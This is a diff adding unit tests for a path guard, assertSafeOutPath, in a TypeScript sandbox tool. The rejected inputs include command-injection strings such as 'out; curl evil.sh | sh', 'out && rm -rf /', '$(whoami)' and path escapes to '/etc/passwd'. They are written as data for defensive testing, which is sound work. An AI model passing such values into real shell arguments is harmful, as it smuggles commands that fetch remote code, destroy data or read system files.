@@ -10,6 +10,7 @@ import { expect, test } from "bun:test";
 import {
   DEFAULT_EXCLUDES,
   EGRESS_PRESETS,
+  assertSafeOutPath,
   cleanupFailureNote,
   egressArgs,
   retentionReasons,
@@ -131,4 +132,42 @@ test("a failed teardown names the box that is still costing money", () => {
   expect(note).toMatch(/STILL ALLOCATED/);
   expect(note).toContain("createos sandbox rm -y sb-1");
   expect(note).toContain("connection timed out");
+});
+
+// --- Artifact path guard --------------------------------------------------
+// `out` reaches a remote shell unquoted so that globs work. The caller already
+// owns remote execution via `command`, so this is defence in depth — but it
+// must not break the globs it exists alongside.
+
+test("ordinary and globbed artifact paths are allowed", () => {
+  for (const ok of [
+    "out",
+    "dist",
+    "dist/*",
+    "build/out-1.tar",
+    "a/b/c",
+    "target/*.whl",
+    "x[0-9]",
+  ]) {
+    expect(() => assertSafeOutPath(ok)).not.toThrow();
+  }
+});
+
+test("shell metacharacters in an artifact path are refused", () => {
+  for (const bad of [
+    "out; curl evil.sh | sh",
+    "out && rm -rf /",
+    "$(whoami)",
+    "`id`",
+    "a|b",
+    "a\nb",
+    "out 'x'",
+  ]) {
+    expect(() => assertSafeOutPath(bad)).toThrow(/may contain only/);
+  }
+});
+
+test("an artifact path may not escape /work", () => {
+  expect(() => assertSafeOutPath("/etc/passwd")).toThrow(/inside \/work/);
+  expect(() => assertSafeOutPath("../../etc")).toThrow(/inside \/work/);
 });
